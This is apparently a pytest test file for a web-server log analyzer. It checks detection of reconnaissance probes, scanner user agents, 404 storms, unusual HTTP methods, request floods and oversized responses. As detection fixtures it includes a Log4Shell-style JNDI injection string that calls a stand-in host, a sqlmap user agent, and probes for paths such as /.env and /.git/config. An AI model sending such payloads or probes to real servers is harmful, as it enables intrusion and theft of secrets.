"""Reconnaissance detection and HTTP anomaly detection."""
from analyzer import anomaly_detector as an
from analyzer import reconnaissance_detector as rec
from config import DetectionConfig
from conftest import analyze, line


def rec_findings(lines, cfg=None):
    return analyze(lines, cfg).by_category("reconnaissance")


def test_classify_paths():
    assert rec.classify_path("/wp-admin/") == ["REC-01"]
    assert rec.classify_path("/.git/config") == ["REC-02"]
    assert rec.classify_path("/server-status") == ["REC-03"]
    assert rec.classify_path("/backup.tar.gz") == ["REC-04"] and rec.classify_path("/index.php.bak") == ["REC-04"]
    assert rec.classify_path("/downloads/brochure.zip") == [] and rec.classify_path("/robots.txt") == []
    assert rec.classify_path("/administration-guide") == [] and rec.classify_path("/blog/admin-tips") == []


def test_three_distinct_sensitive_probes_trigger():
    paths = ["/.env", "/wp-admin/", "/backup.zip"]
    f = rec_findings([line("203.0.113.9", k, path=p, status=404) for k, p in enumerate(paths)])
    assert f and set(f[0].rule_ids) == {"REC-01", "REC-02", "REC-04"}
    assert not rec_findings([line("203.0.113.9", k, path=p, status=404) for k, p in enumerate(paths[:2])])


def test_admin_pages_answered_200_do_not_count():
    lines = [line("192.0.2.50", k, path=p, status=200) for k, p in enumerate(["/admin", "/wp-admin/", "/admin/users"])]
    assert not rec_findings(lines)


def test_scanner_user_agent_alone():
    f = rec_findings([line("198.51.100.23", 0, path="/products.php?id=1", ua="sqlmap/1.8.4#stable")])
    assert f and f[0].rule_ids == ["REC-05"] and "sqlmap" in f[0].explanation


def test_404_storm_and_unique_paths(cfg):
    lines = [line("203.0.113.99", k, path=f"/word{k}", status=404) for k in range(35)]
    f = rec_findings(lines)
    assert {"REC-06", "REC-07"} <= set(f[0].rule_ids)
    assert not rec_findings(lines[:19])                          # 19 < 20 404s and < 30 unique paths


def test_crawler_with_robots_txt_is_not_reconnaissance(normal_lines):
    gb = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    lines = normal_lines + [line("66.249.66.1", k, path=p, ua=gb) for k, p in enumerate(["/robots.txt", "/sitemap.xml"])]
    assert analyze(lines).incidents == []


def test_frequency_and_repeated_path():
    lines = [line("198.51.100.200", k * 0.4, path="/api/products?page=1", ua="Go-http-client/1.1") for k in range(120)]
    res = analyze(lines)
    freq = res.by_category("excessive_frequency")[0]
    assert freq.details["peak"] == 120 and freq.rule_ids == ["ANOM-01"]
    anom = res.by_category("http_anomaly")[0]
    assert {"ANOM-02", "ANOM-05"} <= set(anom.rule_ids)
    assert res.incidents[0].score == 25                     # 15 frequency + 10 anomaly (counted once)
    assert not analyze(lines[:100]).by_category("excessive_frequency")      # exactly 100 is not "more than 100"


def test_unusual_methods_and_invalid_request():
    res = analyze([line("192.0.2.99", 0, "TRACE", "/"), line("192.0.2.99", 1, "PROPFIND", "/"),
                   r'192.0.2.98 - - [02/Nov/2026:09:00:00 +0000] "\x16\x03\x01" 400 226 "-" "-"'])
    by = {f.ip: f for f in res.by_category("http_anomaly")}
    assert "ANOM-03" in by["192.0.2.99"].rule_ids and "TRACE x1" in by["192.0.2.99"].explanation
    assert "INVALID" in by["192.0.2.98"].explanation
    cfg = DetectionConfig(allowed_methods=["GET", "POST", "HEAD", "TRACE", "PROPFIND"])
    assert "192.0.2.99" not in {f.ip for f in analyze([line("192.0.2.99", 0, "TRACE", "/")], cfg).findings}


def test_server_error_ratio():
    lines = [line("198.51.100.30", k, path=f"/p?id={k}", status=500 if k < 6 else 200) for k in range(10)]
    assert "ANOM-04" in analyze(lines).by_category("http_anomaly")[0].rule_ids
    assert not analyze(lines[:9]).by_category("http_anomaly") or \
        "ANOM-04" not in analyze(lines[:9]).by_category("http_anomaly")[0].rule_ids     # < 10 requests


def test_user_agent_issues():
    assert an.ua_issue("", "combined") == "empty User-Agent"
    assert an.ua_issue("", "combined", "-") is None                 # 408 time-outs have no request
    assert an.ua_issue("", "common") is None                        # CLF has no User-Agent field at all
    assert "curl" in an.ua_issue("curl/8.4.0", "combined")
    assert an.ua_issue("${jndi:ldap://x.example/a}", "combined") == "injection syntax in User-Agent"
    assert an.ua_issue("A" * 600, "combined").startswith("User-Agent longer")
    assert an.ua_issue("Mozilla/5.0 (Windows NT 10.0)", "combined") is None


def test_large_response_robust_zscore():
    lines = [line(f"192.0.2.{k}", k, path=f"/p{k}", size=4000 + k * 37) for k in range(1, 40)]
    lines.append(line("192.0.2.200", 50, path="/downloads/catalogue.pdf", size=48_000_000))
    f = analyze(lines).by_category("http_anomaly")
    assert [x.ip for x in f] == ["192.0.2.200"] and f[0].rule_ids == ["ANOM-06"]
    small = lines[:-1] + [line("192.0.2.200", 50, path="/p", size=900_000)]          # below size_min_bytes
    assert not analyze(small).by_category("http_anomaly")


def test_global_profile():
    g = an.global_profile(analyze([line(sec=k) for k in range(30)] + [line(sec=200, status=404)]).df)
    assert g["requests"] == 31 and g["peak_per_minute"] == 30 and g["status_classes"] == {"2xx": 30, "4xx": 1}
